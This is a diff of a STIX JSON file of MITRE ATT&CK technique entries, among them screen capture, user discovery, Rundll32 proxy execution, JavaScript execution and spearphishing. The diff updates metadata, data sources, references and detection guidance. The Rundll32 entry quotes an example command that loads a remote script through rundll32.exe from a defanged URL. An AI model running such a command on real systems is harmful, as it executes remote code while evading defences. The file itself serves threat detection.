@@ -32,10 +32,10 @@
       "type": "attack-pattern",
       "id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:38.097Z",
+      "created": "2017-05-31T21:31:25.060Z",
+      "modified": "2020-03-24T19:56:37.627Z",
       "name": "T1113: Screen Capture",
-      "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)",
+      "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -48,9 +48,9 @@
       ],
       "external_references": [
         {
-          "source_name": "Antiquated Mac Malware",
-          "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
-          "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017."
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1113",
+          "external_id": "T1113"
         },
         {
           "source_name": "capec",
@@ -63,35 +63,33 @@
           "description": "Microsoft. (n.d.). Graphics.CopyFromScreen Method. Retrieved March 24, 2020."
         },
         {
-          "source_name": "mitre-attack",
-          "url": "https://attack.mitre.org/techniques/T1113",
-          "external_id": "T1113"
+          "source_name": "Antiquated Mac Malware",
+          "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
+          "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment."
-      ],
+      "x_mitre_detection": "Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "API monitoring",
-        "File monitoring",
-        "Process monitoring"
+        "Command: Command Execution",
+        "Process: OS API Execution"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_version": "1.1"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:36.978Z",
+      "created": "2017-05-31T21:30:35.733Z",
+      "modified": "2020-03-15T01:03:47.866Z",
       "name": "T1033: System Owner/User Discovery",
       "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nUtilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.",
       "kill_chain_phases": [
@@ -106,32 +104,30 @@
       ],
       "external_references": [
         {
-          "source_name": "capec",
-          "url": "https://capec.mitre.org/data/definitions/577.html",
-          "external_id": "CAPEC-577"
-        },
-        {
           "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/techniques/T1033",
           "external_id": "T1033"
+        },
+        {
+          "source_name": "capec",
+          "url": "https://capec.mitre.org/data/definitions/577.html",
+          "external_id": "CAPEC-577"
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
-      ],
+      "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "File monitoring",
-        "Process command-line parameters",
-        "Process monitoring"
+        "Command: Command Execution",
+        "Process: Process Creation"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "Administrator",
         "User"
@@ -142,8 +138,8 @@
       "type": "attack-pattern",
       "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:38.828Z",
+      "created": "2020-01-23T18:03:46.248Z",
+      "modified": "2021-01-20T18:12:11.843Z",
       "name": "T1218.011: Rundll32",
       "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",
       "kill_chain_phases": [
@@ -163,31 +159,29 @@
           "external_id": "T1218.011"
         },
         {
-          "source_name": "This is Security Command Line Confusion",
-          "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
-          "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018."
-        },
-        {
           "source_name": "Trend Micro CPL",
           "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
           "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017."
+        },
+        {
+          "source_name": "This is Security Command Line Confusion",
+          "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
+          "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded."
-      ],
+      "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.",
       "x_mitre_platforms": [
         "Windows"
       ],
       "x_mitre_data_sources": [
-        "DLL monitoring",
-        "Loaded DLLs",
-        "Process command-line parameters",
-        "Process monitoring"
+        "Command: Command Execution",
+        "Module: Module Load",
+        "Process: Process Creation"
       ],
+      "x_mitre_is_subtechnique": true,
       "x_mitre_permissions_required": [
         "User"
       ],
@@ -200,16 +194,18 @@
         "Casey Smith",
         "Ricardo Dias"
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_version": "1.0",
+      "x_panw_parent_technique": "Signed Binary Proxy Execution",
+      "x_panw_parent_technique_subtechnique": "Signed Binary Proxy Execution: Rundll32"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2020-07-27T14:54:34.130Z",
-      "modified": "2020-07-27T14:54:34.130Z",
+      "created": "2020-06-23T19:12:24.924Z",
+      "modified": "2021-04-27T19:21:05.521Z",
       "name": "T1059.007: JavaScript/JScript",
-      "description": "Adversaries may abuse JavaScript and/or JScript for execution. JavaScript (JS) is a platform-agnostic scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nAdversaries may abuse JavaScript / JScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
+      "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -221,6 +217,16 @@
         }
       ],
       "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1059/007",
+          "external_id": "T1059.007"
+        },
+        {
+          "source_name": "NodeJS",
+          "url": "https://nodejs.org/",
+          "description": "OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020."
+        },
         {
           "source_name": "JScrip May 2018",
           "url": "https://docs.microsoft.com/windows/win32/com/translating-to-jscript",
@@ -237,49 +243,67 @@
           "description": "Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved June 23, 2020."
         },
         {
-          "source_name": "mitre-attack",
-          "url": "https://attack.mitre.org/techniques/T1059/007",
-          "external_id": "T1059.007"
+          "source_name": "Apple About Mac Scripting 2016",
+          "url": "https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html",
+          "description": "Apple. (2016, June 13). About Mac Scripting. Retrieved April 14, 2021."
         },
         {
-          "source_name": "NodeJS",
-          "url": "https://nodejs.org/",
-          "description": "OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020."
+          "source_name": "SpecterOps JXA 2020",
+          "url": "https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5",
+          "description": "Pitt, L. (2020, August 6). Persistent JXA. Retrieved April 14, 2021."
+        },
+        {
+          "source_name": "SentinelOne macOS Red Team",
+          "url": "https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/",
+          "description": "Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple APIs Without Building Binaries. Retrieved July 17, 2020."
+        },
+        {
+          "source_name": "Red Canary Silver Sparrow Feb2021",
+          "url": "https://redcanary.com/blog/clipping-silver-sparrows-wings/",
+          "description": "Tony Lambert. (2021, February 18). Clipping Silver Sparrow\u2019s wings: Outing macOS malware before it takes flight. Retrieved April 20, 2021."
+        },
+        {
+          "source_name": "MDSec macOS JXA and VSCode",
+          "url": "https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/",
+          "description": "Dominic Chell. (2021, January 1). macOS Post-Exploitation Shenanigans with VSCode Extensions. Retrieved April 20, 2021."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
-      ],
+      "x_mitre_detection": "Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nMonitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "DLL monitoring",
-        "File monitoring",
-        "Loaded DLLs",
-        "Process command-line parameters",
-        "Process monitoring"
+        "Command: Command Execution",
+        "Module: Module Load",
+        "Process: Process Creation",
+        "Script: Script Execution"
       ],
+      "x_mitre_is_subtechnique": true,
       "x_mitre_permissions_required": [
         "Administrator",
         "SYSTEM",
         "User"
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_contributors": [
+        "Cody Thomas, SpecterOps"
+      ],
+      "x_mitre_version": "2.0",
+      "x_panw_parent_technique": "Command and Scripting Interpreter",
+      "x_panw_parent_technique_subtechnique": "Command and Scripting Interpreter: JavaScript"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:44.085Z",
+      "created": "2020-03-02T19:15:44.182Z",
+      "modified": "2021-04-14T14:38:42.715Z",
       "name": "T1566.002: Spearphishing Link",
-      "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to elicit sensitive information and/or gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
+      "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -291,60 +315,69 @@
         }
       ],
       "external_references": [
-        {
-          "source_name": "capec",
-          "url": "https://capec.mitre.org/data/definitions/163.html",
-          "external_id": "CAPEC-163"
-        },
         {
           "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/techniques/T1566/002",
           "external_id": "T1566.002"
         },
         {
+          "source_name": "capec",
+          "url": "https://capec.mitre.org/data/definitions/163.html",
+          "external_id": "CAPEC-163"
+        },
+        {
           "source_name": "Trend Micro Pawn Storm OAuth 2017",
           "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks",
           "description": "Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019."
+        },
+        {
+          "source_name": "Microsoft Anti Spoofing",
+          "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
+          "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020."
+        },
+        {
+          "source_name": "ACSC Email Spoofing",
+          "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
+          "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs."
-      ],
+      "x_mitre_detection": "URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.",
       "x_mitre_platforms": [
+        "Google Workspace",
         "Linux",
+        "macOS",
         "Office 365",
         "SaaS",
-        "Windows",
-        "macOS"
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "DNS records",
-        "Detonation chamber",
-        "Email gateway",
-        "Mail server",
-        "Packet capture",
-        "SSL/TLS inspection",
-        "Web proxy"
+        "Application Log: Application Log Content",
+        "Network Traffic: Network Traffic Content",
+        "Network Traffic: Network Traffic Flow"
       ],
+      "x_mitre_is_subtechnique": true,
       "x_mitre_contributors": [
         "Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)",
         "Mark Wee",
+        "Philip Winther",
         "Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)",
         "Shailesh Tiwary (Indian Army)"
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_version": "2.1",
+      "x_panw_parent_technique": "Phishing",
+      "x_panw_parent_technique_subtechnique": "Phishing: Spearphishing Link"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2019-08-26T15:33:33.158Z",
-      "modified": "2020-07-27T14:54:44.085Z",
+      "created": "2020-03-02T19:05:18.137Z",
+      "modified": "2021-04-01T16:21:17.553Z",
       "name": "T1566.001: Spearphishing Attachment",
-      "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to elicit sensitive information and/or gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
+      "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -357,43 +390,59 @@
       ],
       "external_references": [
         {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1566/001",
+          "external_id": "T1566.001"
+        },
+        {
           "source_name": "capec",
           "url": "https://capec.mitre.org/data/definitions/163.html",
           "external_id": "CAPEC-163"
         },
         {
-          "source_name": "mitre-attack",
-          "url": "https://attack.mitre.org/techniques/T1566/001",
-          "external_id": "T1566.001"
+          "source_name": "Microsoft Anti Spoofing",
+          "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
+          "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020."
+        },
+        {
+          "source_name": "ACSC Email Spoofing",
+          "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
+          "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020."
+        },
+        {
+          "source_name": "Elastic - Koadiac Detection with EQL",
+          "url": "https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql",
+          "description": "Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts."
-      ],
+      "x_mitre_detection": "Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "Detonation chamber",
-        "Email gateway",
-        "File monitoring",
-        "Mail server",
-        "Network intrusion detection system",
-        "Packet capture"
+        "Application Log: Application Log Content",
+        "Network Traffic: Network Traffic Content",
+        "Network Traffic: Network Traffic Flow"
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_is_subtechnique": true,
+      "x_mitre_contributors": [
+        "Philip Winther"
+      ],
+      "x_mitre_version": "2.1",
+      "x_panw_parent_technique": "Phishing",
+      "x_panw_parent_technique_subtechnique": "Phishing: Spearphishing Attachment"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:37.764Z",
+      "created": "2017-05-31T21:31:04.307Z",
+      "modified": "2021-03-08T10:33:01.066Z",
       "name": "T1082: System Information Discovery",
